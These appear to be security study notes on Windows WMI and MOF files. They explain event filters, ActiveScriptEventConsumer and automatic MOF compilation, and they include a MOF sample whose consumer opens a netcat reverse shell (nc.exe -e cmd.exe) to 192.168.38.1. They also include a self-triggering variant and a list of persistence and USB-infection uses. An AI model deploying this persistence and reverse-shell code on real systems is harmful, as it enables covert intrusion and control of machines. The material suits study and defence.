# WMI

- Implementation of Web-Based Enterprise Management (WBEM)
- WBEM standard encompasses the design of an
  - extensible enterprise data-collection and data-management facility
  - that has the flexibility and extensibility
  - required to manage local and remote systems that comprise arbitrary components  
- WMI consists of four main components:
  - management applications
  - WMI infrastructure
  - providers
  - managed objects (system, disks, processes, network components...)
- Allows
  -  Execute some code when the notification of an event

![](.assets/WMI architecture.png)
> - http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html
> - CIM - Common Information Model

- WMI repository - stores CIM classes' definitions
- CIM classes
  - hierarchically organized with subclasses
  - grouped in namespaces (logical group of classes)
  - root\cimv2 includes most of the classes that represent computer's resources

- Interesting CIM classes
  - [__EventFilter](http://msdn.microsoft.com/en-us/library/aa394639%28v=vs.85%29.aspx) [[create](http://msdn.microsoft.com/en-us/library/aa389741%28VS.85%29.aspx)]: permits to define a Windows event
  - [__EventConsumer](http://msdn.microsoft.com/en-us/library/aa384749%28VS.85%29.aspx): (abstract consumer class)
    - [ActiveScriptEventConsumer](http://msdn.microsoft.com/en-us/library/aa394635): possible to embed VBScript or JSScript in the consumer (only available in `root\subscription`)
      - Consumer runs with SYSTEM privilege on `Windows XP` and `Windows 2003 Server`
      - `Vista`, it is running under the LOCAL_SERVICE user
  - [__FilterToConsumerBinding](http://msdn.microsoft.com/en-us/library/aa394647%28v=VS.85%29.aspx): link two other instances. (permits to activate the consumer - and to execute its code - whenever the defined event occurs)

- [MOF (Managed Object Format)](http://msdn.microsoft.com/en-us/library/aa823192%28VS.85%29.aspx)
  - Language used to describe CIM classes
  - MOF file needs to be registered into the CIM/WMI repository in order to be taken into account by WMI
    - CIM class(es) MOF describes are added into the repository
  - Compilation
    - Compiled using `mofcomp.exe`
  - Auto compile & register
    - Writable to `Administrator` only
    - Files added to  `%SystemRoot%\System32\wbem\mof\` get auto compiled and registered (before Vista)
    - Logs are in `%SystemRoot%\System32\wbem\mof\Logs\mofcomp.log`

Wait for a windows event and trigger:
```
#pragma namespace ("\\\\.\\root\\subscription")

instance of __EventFilter as $FILTER
{
    Name = "CLASS_FIRST_TEST";
    EventNamespace = "root\\cimv2";
 Query = "SELECT * FROM __InstanceCreationEvent "
  "WHERE TargetInstance ISA \"Win32_NTLogEvent\" AND "
  "TargetInstance.LogFile=\"Application\"";

    QueryLanguage = "WQL";
};

instance of ActiveScriptEventConsumer as $CONSUMER
{
    Name = "CLASS_FIRST_TEST";
    ScriptingEngine = "VBScript";

    ScriptText =
      "Set objShell = CreateObject(\"WScript.Shell\")\n"
   "objShell.Run \"C:\\Windows\\system32\\cmd.exe /C C:\\nc.exe 192.168.38.1 1337 -e C:\\Windows\\system32\\cmd.exe\"\n";
};

instance of __FilterToConsumerBinding
{
    Consumer = $CONSUMER ;
    Filter = $FILTER ;
};
```
> - Ref: [http://www.hsc-news.com/archives/2011/000078.html](http://www.hsc-news.com/archives/2011/000078.html)

Self start:
```
#pragma namespace ("\\\\.\\root\\subscription")

class WoootClass
{
 [key]
 string Name;
};

instance of __EventFilter as $FILTER
{
    Name = "XPLOIT_TEST_SYSTEM";
    EventNamespace = "root\\subscription";
 Query = "SELECT * FROM __InstanceCreationEvent "
         "WHERE TargetInstance.__class = \"WoootClass\"";

    QueryLanguage = "WQL";
};

instance of ActiveScriptEventConsumer as $CONSUMER
{
    // ...     
};

instance of __FilterToConsumerBinding
{
    // ...
};

instance of WoootClass
{
 Name = "Woot";
};

```

- Usages
  - Automatically kill some processes as soon as they are launched (anti-rootkits...),
  - Automatically detect when the backdoor/rootkit has been deleted to load it again (dropper),
  - Automatically infect USB devices

## List all the systems within the current environment/directory

```
SELECT ds_cn FROM ds_computer
```

## Tools

- WMI Object Browser:

## References

- [Playing with MOF files on Windows, for fun & profit](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html)
- [Exposing System Secrets with VBA and WMI API](https://sites.google.com/site/beyondexcel/project-updates/exposingsystemsecretswithvbaandwmiapi)
- [How to use WbemExec for a write privilege attack on Windows](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows)
